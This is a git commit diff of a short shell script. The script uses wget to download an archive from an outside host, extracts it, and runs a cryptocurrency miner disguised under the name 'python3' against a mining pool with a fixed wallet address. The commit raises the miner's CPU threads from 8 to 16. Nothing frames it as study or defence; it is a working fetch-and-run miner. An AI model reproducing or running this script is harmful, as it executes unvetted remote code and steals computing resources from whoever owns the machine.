694c38d601ad6570f76a56700df2d94f1228d7e5
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-07-24 02:35:42 +0700

    Update luczpo.sh

--- luczpo.sh
+++ luczpo.sh
@@ -1,4 +1,4 @@
 wget -O meki momok.x10.bz/DOT-SRB.tar.gz
 tar -xvf meki
 cd dotsrb
-./python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz --cpu-threads 8
+./python3 -a yespowersugar -o nomp.mofumofu.me:3391 -u sugar1q9k38saldc5ey6389u86ar0a9nuxsuyu59z8acz --cpu-threads 16
